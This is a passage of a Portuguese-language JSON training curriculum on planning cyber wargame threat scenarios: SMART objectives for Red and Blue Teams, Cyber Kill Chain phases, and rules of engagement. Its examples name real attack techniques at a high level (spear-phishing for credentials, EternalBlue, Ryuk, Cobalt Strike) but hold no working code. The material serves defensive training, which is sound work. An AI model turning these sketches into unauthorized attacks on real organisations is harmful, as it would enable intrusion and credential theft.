                                    "Crie um mapa mental ou tabela extraindo: ator da ameaça, ferramentas usadas, mitigações falhas.",
                                    "Compare múltiplas fontes para padrões comuns em campanhas reais.",
                                    "Documente citações diretas para suporte factual."
                                  ],
                                  "verification": "Tabela ou mapa mental com extrações chave de pelo menos 3 fontes, incluindo citações.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": "Ferramentas de análise como Excel, MindMeister ou draw.io; PDFs dos relatórios.",
                                  "tips": "Use o framework MITRE ATT&CK Navigator para visualizar matrizes de TTPs.",
                                  "learningObjective": "Extrair informações acionáveis de relatórios complexos de cibersegurança.",
                                  "commonMistakes": "Ignorar contexto histórico ou superestimar generalizações de casos isolados."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Elementos Reais para o Cenário de Ameaça",
                                  "subSteps": [
                                    "Defina o escopo do cenário (ex.: ataque a infraestrutura crítica).",
                                    "Alinhe TTPs extraídos ao kill chain do cenário: reconnaissance, weaponization, etc.",
                                    "Adapte procedimentos reais sem alterar fatos (ex.: substitua IP real por placeholder).",
                                    "Incorpore variações realistas baseadas em evoluções documentadas de ameaças.",
                                    "Crie narrativa do cenário ancorada em evidências citadas."
                                  ],
                                  "verification": "Rascunho do cenário com mapeamento TTPs-fonte destacado em negrito ou hyperlinks.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Editor de texto como Google Docs ou Markdown; MITRE ATT&CK Navigator.",
                                  "tips": "Mantenha 80% do cenário fiel aos fatos reais para autenticidade.",
                                  "learningObjective": "Integrar dados reais em estruturas de cenários de simulação cibernética.",
                                  "commonMistakes": "Inventar TTPs não documentados ou exagerar capacidades de atores."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Documentar a Fundamentação do Cenário",
                                  "subSteps": [
                                    "Revise o cenário contra fontes originais para precisão factual.",
                                    "Consulte pares ou mentores para feedback em realismo.",
                                    "Inclua seção de referências com justificativa de uso de cada fonte.",
                                    "Teste o cenário em simulação básica para viabilidade.",
                                    "Atualize documentação com lições aprendidas da validação."
                                  ],
                                  "verification": "Documento final do cenário com seção de validação e referências completas aprovado por revisor.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": "Ferramenta de revisão colaborativa como GitHub ou Overleaf; checklist de validação.",
                                  "tips": "Use timestamps de relatórios para demonstrar atualidade.",
                                  "learningObjective": "Garantir rigor científico e auditabilidade em cenários de ameaça.",
                                  "commonMistakes": "Omitir referências ou falhar em validar contra fontes primárias."
                                }
                              ],
                              "practicalExample": "Para um cenário de ransomware em hospital: Baseie no ataque Ryuk (documentado no MITRE ATT&CK ID T1486), usando relatório da CISA de 2021. Extraia TTPs como spear-phishing inicial (T1566.001), mapeie para kill chain e valide com IOCs reais anonimizados.",
                              "finalVerifications": [
                                "Todas as TTPs citadas estão diretamente mapeadas a fontes reais com links.",
                                "Nenhum elemento fictício é introduzido sem justificativa baseada em variações documentadas.",
                                "Referências incluem data, autor e relevância ao contexto.",
                                "Cenário é testável em ambiente simulado sem dependências irreais.",
                                "Documentação permite reprodução por terceiros.",
                                "Realismo avaliado em escala de 1-10 com pontuação >=8."
                              ],
                              "assessmentCriteria": [
                                "Profundidade da pesquisa: Número e qualidade das fontes (4+ primárias).",
                                "Precisão do mapeamento: Fidelidade aos TTPs reais (sem distorções).",
                                "Documentação: Clareza e completude das citações (formato APA/IEEE).",
                                "Realismo geral: Ausência de invenções e alinhamento com casos históricos.",
                                "Viabilidade prática: Cenário acionável para jogos de guerra.",
                                "Inovação controlada: Variações lógicas baseadas em tendências documentadas."
                              ],
                              "crossCurricularConnections": [
                                "Pesquisa Acadêmica: Métodos de revisão bibliográfica em ciências da computação.",
                                "Análise de Dados: Extração e visualização de IOCs como em ciência de dados.",
                                "Ética Profissional: Uso responsável de dados sensíveis de segurança.",
                                "Jornalismo Investigativo: Verificação de fontes e fact-checking."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, esse princípio fundamenta exercícios realistas como os da série Cyber Storm do DHS, permitindo treinamentos que preparam equipes para ameaças como APTs estatais (ex.: Noble Dragon), melhorando detecção e resposta em incidentes reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.3.2",
                            "name": "Definir objetivos claros e mensuráveis",
                            "description": "Estabelecer objetivos SMART (Specific, Measurable, Achievable, Relevant, Time-bound) para cenários, incluindo critérios de vitória/derrota para Red e Blue Teams.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Framework SMART",
                                  "subSteps": [
                                    "Estude a definição de cada componente SMART: Specific (Específico), Measurable (Mensurável), Achievable (Alcançável), Relevant (Relevante), Time-bound (Temporal).",
                                    "Analise exemplos de objetivos SMART ruins versus bons em contextos de cibersegurança.",
                                    "Identifique como SMART se aplica a cenários de jogos de guerra cibernética, focando em Red e Blue Teams.",
                                    "Crie um checklist pessoal para cada letra do SMART.",
                                    "Discuta com um parceiro ou anote por que cada componente é crucial para cenários de ameaça."
                                  ],
                                  "verification": "Checklist completo preenchido com pelo menos um exemplo para cada componente SMART adaptado a cibersegurança.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Guia SMART impresso ou digital, exemplos de cenários cibernéticos (ex: MITRE ATT&CK framework).",
                                  "tips": "Use mnemônicos para lembrar SMART; visualize cenários reais como phishing ou DDoS.",
                                  "learningObjective": "Dominar os cinco componentes do framework SMART e sua relevância em planejamento cibernético.",
                                  "commonMistakes": "Confundir 'Achievable' com 'fácil' (deve ser realista, não trivial); ignorar o contexto de Red/Blue Teams."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Contexto do Cenário de Ameaça",
                                  "subSteps": [
                                    "Descreva o cenário cibernético (ex: ataque de ransomware a uma rede corporativa).",
                                    "Identifique stakeholders: Red Team (atacantes), Blue Team (defensores).",
                                    "Mapeie recursos disponíveis, restrições e ambiente (ex: ferramentas, rede simulada).",
                                    "Liste riscos potenciais e impactos desejados para vitória/derrota.",
                                    "Priorize elementos críticos que influenciam objetivos mensuráveis."
                                  ],
                                  "verification": "Documento de análise de contexto com mapa de stakeholders e lista de riscos priorizados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramentas de modelagem como Draw.io para diagramas, documentação de cenários (ex: NIST Cybersecurity Framework).",
                                  "tips": "Comece pelo 'porquê' do cenário para garantir relevância.",
                                  "learningObjective": "Mapear contexto para fundamentar objetivos SMART contextualizados.",
                                  "commonMistakes": "Sobrecarregar com detalhes irrelevantes; não diferenciar perspectivas Red vs. Blue."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Draftar Objetivos SMART para Red e Blue Teams",
                                  "subSteps": [
                                    "Escreva um objetivo Specific para Red Team (ex: 'Comprometer 3 servidores via exploit zero-day').",
                                    "Torne mensurável adicionando métricas (ex: 'em menos de 2 horas').",
                                    "Verifique Achievable com recursos reais; Relevant ao cenário; Time-bound com prazo.",
                                    "Repita para Blue Team (ex: 'Detectar e mitigar 80% dos acessos não autorizados em 30 minutos').",
                                    "Inclua critérios iniciais de vitória/derrota baseados em métricas."
                                  ],
                                  "verification": "Dois objetivos draftados (um por team) passando no checklist SMART.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Template de objetivo SMART (planilha Google Sheets), exemplos de cenários MITRE.",
                                  "tips": "Use verbos acionáveis (comprometer, detectar) e quantifique tudo possível.",
                                  "learningObjective": "Criar objetivos draftados que atendam integralmente ao framework SMART.",
                                  "commonMistakes": "Objetivos vagos como 'melhorar defesa'; esquecer time-bound levando a escopo infinito."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Definir Critérios de Vitória/Derrota e Refinar",
                                  "subSteps": [
                                    "Liste 3-5 critérios mensuráveis de vitória para Red (ex: % de dados exfiltrados).",
                                    "Defina critérios de derrota correspondentes para Blue (ex: tempo de detecção > threshold).",
                                    "Teste objetivos em simulação mental ou ferramenta simples.",
                                    "Refine com feedback: ajuste para equilíbrio e realismo.",
                                    "Documente versão final com justificativas SMART."
                                  ],
                                  "verification": "Lista de critérios finalizados e objetivos refinados validados por auto-revisão.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Simulador básico (ex: Cyber Range tool gratuito), template de critérios.",
                                  "tips": "Garanta critérios mutuamente exclusivos para evitar ambiguidades.",
                                  "learningObjective": "Integrar critérios de vitória/derrota em objetivos SMART refinados.",
                                  "commonMistakes": "Critérios subjetivos (ex: 'boa performance'); desequilíbrio entre teams."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Documentar Objetivos Finais",
                                  "subSteps": [
                                    "Aplique checklist SMART aos objetivos finais.",
                                    "Simule revisão por pares: identifique gaps.",
                                    "Integre a cenários maiores (ex: plano de jogo de guerra).",
                                    "Crie resumo executivo com objetivos e critérios.",
                                    "Planeje monitoramento durante execução."
                                  ],
                                  "verification": "Documento final aprovado pelo checklist e simulação de revisão.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Checklist SMART revisado, software de documentação (ex: Markdown ou Word).",
                                  "tips": "Sempre pergunte: 'Isso é testável em um exercício real?'",
                                  "learningObjective": "Produzir objetivos validados, documentados e prontos para uso.",
                                  "commonMistakes": "Pular validação, resultando em objetivos irrealistas no campo."
                                }
                              ],
                              "practicalExample": "Para um cenário de phishing em uma empresa: Red Team - 'Enviar 500 e-mails de phishing e obter credenciais de 20% dos alvos em 48 horas (S: e-mails específicos; M: 20%; A: ferramentas disponíveis; R: simula ameaça real; T: 48h). Vitória: 100 credenciais; Derrota: <10%. Blue: Detectar 90% em 1 hora.'",
                              "finalVerifications": [
                                "Todos os objetivos passam 100% no checklist SMART.",
                                "Critérios de vitória/derrota são quantificáveis e mutuamente exclusivos.",
                                "Objetivos alinhados ao contexto do cenário de ameaça.",
                                "Tempo estimado para conquista é realista com recursos disponíveis.",
                                "Documentação inclui justificativas para cada componente SMART.",
                                "Simulação mental confirma viabilidade para Red e Blue Teams."
                              ],
                              "assessmentCriteria": [
                                "Clareza e especificidade dos objetivos (nota 1-10).",
                                "Mensurabilidade com métricas precisas (ex: %, tempo, contagem).",
                                "Realismo e alcançabilidade baseada em cenários reais.",
                                "Relevância ao contexto cibernético e equilíbrio Red/Blue.",
                                "Estrutura temporal clara e integrada.",
                                "Qualidade da documentação e verificações incluídas."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos (PMBOK: definição de escopo e metas).",
                                "Psicologia Comportamental (motivação por metas claras em equipes).",
                                "Estatística (métricas mensuráveis e KPIs).",
                                "Gestão de Riscos (ISO 31000: identificação de critérios de sucesso/falha)."
                              ],
                              "realWorldApplication": "Em operações de Response a Incidentes (ex: CERT teams definindo metas para contenção de breaches) ou Red Team engagements em empresas como Google ou bancos, garantindo exercícios cibernéticos eficazes com outcomes mensuráveis para melhoria contínua de defesas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.3.3",
                            "name": "Estruturar fases do ciclo de ataque",
                            "description": "Organizar o cenário em fases como reconnaissance, weaponization, delivery, exploitation, installation, C2 e actions on objectives, inspirado em frameworks como Cyber Kill Chain.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o framework Cyber Kill Chain",
                                  "subSteps": [
                                    "Estude a origem e propósito do Cyber Kill Chain desenvolvido pela Lockheed Martin.",
                                    "Memorize as sete fases principais: Reconhecimento, Armamentação, Entrega, Exploração, Instalação, Comando e Controle (C2), Ações sobre Objetivos.",
                                    "Analise como o framework modela ataques cibernéticos como uma cadeia linear com possíveis interrupções.",
                                    "Compare com outros modelos como MITRE ATT&CK para contextualizar.",
                                    "Identifique limitações do modelo, como foco em ataques direcionados."
                                  ],
                                  "verification": "Liste corretamente as sete fases e descreva brevemente cada uma em um documento.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigo original da Lockheed Martin sobre Cyber Kill Chain (PDF)",
                                    "Vídeo explicativo no YouTube (MITRE ou SANS Institute)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use mnemônicos como 'RAEDICA' para lembrar as fases (Recon, Arm, Entrega, Exploração, Instalação, C2, Ações).",
                                  "learningObjective": "Entender a estrutura e o propósito do Cyber Kill Chain como base para modelar ciclos de ataque.",
                                  "commonMistakes": [
                                    "Confundir fases como 'Exploração' com 'Entrega'.",
                                    "Ignorar que o modelo é linear e não cobre ataques oportunistas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Detalhar descrições e atividades de cada fase",
                                  "subSteps": [
                                    "Para Reconhecimento: Liste técnicas como OSINT, scanning de portas e footprinting.",
                                    "Para Armamentação: Descreva criação de exploits e payloads personalizados.",
                                    "Para Entrega: Explique vetores como phishing, watering hole e drive-by downloads.",
                                    "Para Exploração: Detalhe vulnerabilidades exploradas (ex: buffer overflow).",
                                    "Para Instalação, C2 e Ações: Descreva backdoors, comunicação persistente e exfiltração de dados."
                                  ],
                                  "verification": "Crie uma tabela com fase, descrição, técnicas comuns e exemplos reais.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Lista de TTPs (Tactics, Techniques, Procedures)",
                                    "Ferramenta de tabela como Google Sheets ou Excel"
                                  ],
                                  "tips": "Associe cada fase a ferramentas reais como Nmap (recon), Metasploit (exploração).",
                                  "learningObjective": "Desenvolver descrições detalhadas e acionáveis para cada fase do ciclo.",
                                  "commonMistakes": [
                                    "Descrever fases de forma genérica sem técnicas específicas.",
                                    "Omitir dependências entre fases (ex: entrega requer reconhecimento)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estruturar o ciclo de ataque em sequência lógica",
                                  "subSteps": [
                                    "Crie um fluxograma mostrando fluxo das fases com setas de transição.",
                                    "Defina pontos de interrupção defensivos em cada fase (ex: detecção no C2).",
                                    "Inclua loops ou ramificações para cenários realistas (ex: pivoting pós-instalação).",
                                    "Mapeie o ciclo a um cenário hipotético simples.",
                                    "Adicione métricas de sucesso para cada fase (ex: tempo estimado, indicadores)."
                                  ],
                                  "verification": "Produza um fluxograma ou diagrama exportável validado por auto-revisão.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Draw.io ou Lucidchart (gratuito)",
                                    "Templates de Cyber Kill Chain online",
                                    "Exemplos de cenários de ataque de relatórios públicos (ex: Mandiant)"
                                  ],
                                  "tips": "Use cores para diferenciar fases ofensivas e pontos defensivos.",
                                  "learningObjective": "Organizar fases em uma estrutura visual sequencial e interdependente.",
                                  "commonMistakes": [
                                    "Tratar fases como isoladas sem mostrar dependências.",
                                    "Criar diagramas muito complexos no início."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e documentar a estrutura para cenários de ameaça",
                                  "subSteps": [
                                    "Teste a estrutura aplicando-a a um caso real (ex: SolarWinds).",
                                    "Revise por completude: todas fases cobertas? Transições lógicas?",
                                    "Adicione seção de adaptações para ataques não-lineares.",
                                    "Documente em formato reutilizável (template Markdown ou Word).",
                                    "Compartilhe com pares para feedback simulado."
                                  ],
                                  "verification": "Gere um documento final de 2-3 páginas com estrutura validada.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Relatórios de incidentes (ex: Verizon DBIR)",
                                    "Template de documento Google Docs",
                                    "Ferramenta de revisão como Grammarly"
                                  ],
                                  "tips": "Sempre inclua 'ações sobre objetivos' como fase final para alinhar com metas do atacante.",
                                  "learningObjective": "Finalizar uma estrutura robusta e adaptável para planejamento de cenários.",
                                  "commonMistakes": [
                                    "Não validar com exemplos reais.",
                                    "Esquecer documentação clara para reutilização."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de ransomware contra uma empresa: 1. Reconhecimento (OSINT via LinkedIn e Shodan); 2. Armamentação (exploit RDP customizado); 3. Entrega (phishing com anexo); 4. Exploração (CVE-2017-0144 EternalBlue); 5. Instalação (backdoor Ryuk); 6. C2 (comunicação via Cobalt Strike); 7. Ações (criptografia de arquivos e pedido de resgate).",
                              "finalVerifications": [
                                "Pode recitar as sete fases na ordem correta sem consulta.",
                                "Descreve técnicas específicas para pelo menos três fases.",
                                "Cria um fluxograma funcional de um ciclo completo.",
                                "Identifica pontos de defesa em cada fase.",
                                "Aplica a estrutura a um exemplo real com precisão.",
                                "Documenta tudo de forma clara e profissional."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na identificação das fases (90%+ acurácia).",
                                "Nível de detalhe nos sub-passos e técnicas (mínimo 3 por fase).",
                                "Qualidade visual e lógica do fluxograma/diagrama.",
                                "Relevância das verificações e dicas práticas.",
                                "Capacidade de adaptação a cenários variados.",
                                "Clareza e profissionalismo na documentação final."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Fases semelhantes ao PMBOK (iniciação, planejamento, execução).",
                                "Análise de Riscos: Mapeamento de ameaças como em ISO 31000.",
                                "Inteligência de Negócios: OSINT similar a pesquisa de mercado.",
                                "Engenharia de Software: Ciclo de vida de desenvolvimento de malware.",
                                "Estratégia Militar: Analogia com doutrina de guerra cibernética (OODA Loop)."
                              ],
                              "realWorldApplication": "Utilizado em operações de Red Team para simular ataques realistas, planejamento defensivo em SOCs (Security Operations Centers), criação de exercícios de Tabletop para equipes de resposta a incidentes e relatórios de threat hunting em empresas como em simulações da CERT.br ou eventos como Black Hat."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.2",
                    "name": "Etapas do Planejamento Estratégico",
                    "description": "Fases sequenciais para planejar cenários, incluindo identificação de objetivos e escopo.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.2.1",
                        "name": "Identificação de Objetivos Estratégicos",
                        "description": "Fase inicial do planejamento estratégico que envolve a definição clara e mensurável dos objetivos do cenário de ameaça, alinhados com o mindset do adversário e as metas do Red Team, considerando impactos desejados em operações cibernéticas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.1.1",
                            "name": "Definir Objetivos SMART",
                            "description": "Aplicar o framework SMART (Específico, Mensurável, Alcançável, Relevante, Temporal) para formular objetivos de cenários de ameaça, garantindo que eles reflitam táticas reais de adversários cibernéticos como em jogos de guerra.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Framework SMART no Contexto de Cenários de Ameaça Cibernética",
                                  "subSteps": [
                                    "Estudar as definições de cada componente SMART (Específico, Mensurável, Alcançável, Relevante, Temporal).",
                                    "Analisar exemplos de objetivos vagos versus SMART em jogos de guerra cibernética, usando táticas do MITRE ATT&CK.",
                                    "Mapear componentes SMART a táticas reais de adversários, como phishing ou ransomware.",
                                    "Criar um checklist personalizado para cenários de ameaça.",
                                    "Discutir com pares ou revisar documentação de operações cibernéticas."
                                  ],
                                  "verification": "Produzir um resumo escrito ou tabela com definições SMART adaptadas a exemplos cibernéticos, confirmando compreensão de todos os 5 componentes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Guia SMART (PDF ou online)",
                                    "MITRE ATT&CK Navigator",
                                    "Exemplos de cenários de jogos de guerra cibernética"
                                  ],
                                  "tips": "Sempre ancorar exemplos em táticas reais de adversários para maior relevância.",
                                  "learningObjective": "Dominar os componentes SMART e sua aplicação específica a objetivos de ameaças cibernéticas.",
                                  "commonMistakes": [
                                    "Ignorar o contexto cibernético, tratando SMART como genérico; confundir 'Mensurável' com 'Específico'."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Formular o Objetivo Específico e Mensurável",
                                  "subSteps": [
                                    "Identificar o 'quem', 'o quê', 'onde' e 'como' do cenário de ameaça (ex: ator específico, vetor de ataque).",
                                    "Definir métricas claras de sucesso (ex: número de credenciais roubadas, taxa de infecção).",
                                    "Escrever rascunho inicial focando em S e M, usando verbos acionáveis.",
                                    "Testar especificidade perguntando: 'Pode ser observado e quantificado?'",
                                    "Refinar com dados reais de incidentes passados."
                                  ],
                                  "verification": "Rascunho inicial do objetivo passa no teste de S e M: legível e quantificável por terceiros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Templates de objetivos SMART",
                                    "Relatórios de incidentes cibernéticos (ex: Verizon DBIR)",
                                    "Ferramenta de texto colaborativo"
                                  ],
                                  "tips": "Use linguagem precisa como '90% de cliques em phishing' em vez de 'muitos cliques'.",
                                  "learningObjective": "Criar objetivos específicos e mensuráveis que reflitam táticas de adversários reais.",
                                  "commonMistakes": [
                                    "Ser vago (ex: 'atacar rede' em vez de 'explorar CVE-2023-XXXX'); omitir métricas numéricas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Garantir que o Objetivo seja Alcançável e Relevante",
                                  "subSteps": [
                                    "Avaliar recursos disponíveis (equipe, ferramentas, tempo) contra o objetivo.",
                                    "Verificar alinhamento com metas estratégicas do jogo de guerra (ex: testar defesas específicas).",
                                    "Consultar stakeholders para validar relevância a ameaças reais.",
                                    "Ajustar escopo se necessário para torná-lo realista.",
                                    "Documentar justificativa de alcançabilidade com evidências."
                                  ],
                                  "verification": "Checklist assinado confirmando A e R, com evidências de recursos e alinhamento estratégico.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Matriz de recursos da equipe",
                                    "Estratégia organizacional de cibersegurança",
                                    "Lista de táticas MITRE priorizadas"
                                  ],
                                  "tips": "Pergunte: 'Com o que temos, podemos realisticamente simular essa tática?'",
                                  "learningObjective": "Adaptar objetivos para serem viáveis e alinhados a prioridades cibernéticas.",
                                  "commonMistakes": [
                                    "Superestimar capacidades (ex: simular ataque nation-state com equipe pequena); ignorar relevância organizacional."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Incorporar o Aspecto Temporal e Integrar Todos os Componentes",
                                  "subSteps": [
                                    "Definir prazos claros (ex: 'em 48 horas' ou 'até Q3 2024').",
                                    "Combinar todos os elementos SMART em um objetivo único e coeso.",
                                    "Ler em voz alta para fluidez e clareza.",
                                    "Simular execução rápida para testar temporalidade.",
                                    "Ajustar com base em restrições reais de jogos de guerra."
                                  ],
                                  "verification": "Objetivo completo escrito, com T explícito e todos os 5 critérios atendidos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Cronograma de projeto",
                                    "Ferramenta de edição de texto",
                                    "Exemplos de objetivos SMART de ciberdefesa"
                                  ],
                                  "tips": "Use datas específicas ou milestones para evitar ambiguidades como 'em breve'.",
                                  "learningObjective": "Finalizar objetivos SMART completos e temporais para cenários de ameaça.",
                                  "commonMistakes": [
                                    "Prazos irreais (ex: '1 dia para ataque global'); não integrar todos os componentes fluidamente."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Revisar, Validar e Refinar o Objetivo Final",
                                  "subSteps": [
                                    "Aplicar checklist SMART completo ao objetivo.",
                                    "Obter feedback de pares ou mentor em segurança cibernética.",
                                    "Comparar com táticas reais de adversários para autenticidade.",
                                    "Iterar refinamentos até aprovação.",
                                    "Documentar versão final com justificativas."
                                  ],
                                  "verification": "Objetivo aprovado por revisão externa, passando em todos os critérios SMART.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Checklist SMART impresso",
                                    "Ferramenta de feedback (ex: Google Forms)",
                                    "Base de dados MITRE ATT&CK"
                                  ],
                                  "tips": "Busque feedback focado em 'Isso simula um adversário real?'",
                                  "learningObjective": "Refinar objetivos para máxima eficácia em planejamento de jogos de guerra.",
                                  "commonMistakes": [
                                    "Pular revisão (levando a falhas no exercício); não validar contra táticas reais."
                                  ]
                                }
                              ],
                              "practicalExample": "Objetivo vago: 'Simular um ataque cibernético'. Objetivo SMART: 'A equipe Red Team de 4 analistas executará um ataque de spear-phishing simulando o grupo APT29 (Cozy Bear), visando capturar credenciais de 20% dos 150 funcionários administrativos da empresa em até 72 horas durante o exercício de jogo de guerra de 1 semana em outubro de 2024, alinhado à priorização de defesas contra espionagem russa.'",
                              "finalVerifications": [
                                "Objetivo atende a todos os 5 critérios SMART sem ambiguidades.",
                                "Reflete táticas reais de adversários (verificação via MITRE ATT&CK).",
                                "É acionável por equipe real com recursos disponíveis.",
                                "Alinhado a metas estratégicas do jogo de guerra.",
                                "Pode ser mensurado com métricas claras no final do exercício.",
                                "Versão final documentada e aprovada por stakeholders."
                              ],
                              "assessmentCriteria": [
                                "Especificidade: Detalhes claros sobre ator, método e alvo (nota 1-5).",
                                "Mensurabilidade: Métricas quantificáveis definidas (nota 1-5).",
                                "Alcançabilidade: Evidências de viabilidade com recursos (nota 1-5).",
                                "Relevância: Alinhamento a ameaças organizacionais reais (nota 1-5).",
                                "Temporalidade: Prazos precisos e realistas (nota 1-5).",
                                "Coerência geral: Fluidez e profissionalismo do texto (nota 1-5)."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Uso de SMART em planejamento ágil e OKRs.",
                                "Análise de Riscos: Integração com frameworks como NIST ou ISO 27001.",
                                "Estratégia Militar: Paralelos com objetivos em wargames tradicionais.",
                                "Psicologia Comportamental: Influência em comportamentos de equipe sob pressão temporal.",
                                "Inteligência de Ameaças: Mapeamento direto ao MITRE ATT&CK."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, analistas de SOC usam objetivos SMART para simular ataques reais como ransomware (ex: Conti group), permitindo equipes de defesa testarem respostas eficazes, medir eficácia de treinamentos e melhorar resiliência organizacional contra ameaças persistentes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.2",
                            "name": "Alinhar Objetivos com Regras de Engajamento",
                            "description": "Integrar as regras de engajamento (RoE) definidas para o exercício, assegurando que os objetivos respeitem limites legais, éticos e operacionais, com base em guias como o Red Team Development and Operations.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar e Compreender as Regras de Engajamento (RoE)",
                                  "subSteps": [
                                    "Obtenha o documento oficial de RoE para o exercício cibernético.",
                                    "Leia integralmente as seções sobre limites legais, éticos e operacionais.",
                                    "Identifique e anote categorias chave: proibições absolutas, restrições condicionais e requisitos de autorização.",
                                    "Crie um mapa mental ou tabela resumindo os pontos principais das RoE.",
                                    "Consulte guias complementares como o Red Team Development and Operations para contextualizar."
                                  ],
                                  "verification": "Checklist completo de compreensão assinado, com resumo em uma página.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documento RoE oficial",
                                    "Guia Red Team Development and Operations",
                                    "Ferramenta de mapeamento mental (ex: MindMeister ou papel/caneta)"
                                  ],
                                  "tips": "Leia as RoE pelo menos duas vezes: uma para visão geral e outra para detalhes específicos.",
                                  "learningObjective": "Dominar o conteúdo das RoE para identificar restrições aplicáveis aos objetivos.",
                                  "commonMistakes": [
                                    "Ignorar seções éticas ou operacionais",
                                    "Não anotar exemplos de violações passadas",
                                    "Assumir conhecimento prévio sem revisão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Listar e Categorizar Objetivos Estratégicos Propostos",
                                  "subSteps": [
                                    "Compile a lista completa de objetivos estratégicos do planejamento do cenário de ameaça.",
                                    "Classifique cada objetivo por tipo: ofensivo, defensivo, de inteligência ou de simulação.",
                                    "Descreva brevemente ações específicas envolvidas em cada objetivo.",
                                    "Avalie riscos iniciais associados a cada objetivo (legal, ético, operacional).",
                                    "Priorize objetivos por criticidade para o exercício de wargame cibernético."
                                  ],
                                  "verification": "Tabela de objetivos categorizados com classificações e riscos iniciais preenchida.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Lista inicial de objetivos estratégicos",
                                    "Planilha Excel ou Google Sheets para categorização"
                                  ],
                                  "tips": "Use verbos de ação claros (ex: 'simular', 'testar') para descrever objetivos e facilitar mapeamento.",
                                  "learningObjective": "Organizar objetivos de forma estruturada para análise de alinhamento.",
                                  "commonMistakes": [
                                    "Omitir objetivos secundários",
                                    "Superestimar viabilidade sem considerar RoE",
                                    "Não quantificar riscos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Objetivos às RoE e Identificar Conflitos",
                                  "subSteps": [
                                    "Para cada objetivo, cruze-referencie com seções relevantes das RoE.",
                                    "Marque alinhamentos (verde), potenciais conflitos (amarelo) e violações claras (vermelho).",
                                    "Analise conflitos usando critérios do Red Team: legalidade, ética e impacto operacional.",
                                    "Documente justificativas para cada marcação, citando cláusulas específicas das RoE.",
                                    "Priorize resolução de violações de alto risco."
                                  ],
                                  "verification": "Matriz de mapeamento preenchida com 100% dos objetivos analisados e conflitos destacados.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Matriz de mapeamento (planilha)",
                                    "Documento RoE anotado",
                                    "Guia Red Team"
                                  ],
                                  "tips": "Use cores e símbolos para visualização rápida; envolva um par para revisão cruzada.",
                                  "learningObjective": "Desenvolver habilidade em detectar desalinhamentos entre objetivos e restrições.",
                                  "commonMistakes": [
                                    "Mapeamento superficial sem citações",
                                    "Ignorar conflitos éticos sutis",
                                    "Não priorizar riscos altos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ajustar Objetivos, Documentar e Validar Alinhamento",
                                  "subSteps": [
                                    "Modifique objetivos em conflito para garantir conformidade (ex: substituir ações reais por simulações).",
                                    "Crie um relatório de alinhamento com versões originais vs. ajustadas e racionalizações.",
                                    "Obtenha aprovação de stakeholders (ex: equipe legal ou comando).",
                                    "Realize uma simulação rápida ou walkthrough para testar alinhamento prático.",
                                    "Atualize o plano estratégico com a versão final alinhada."
                                  ],
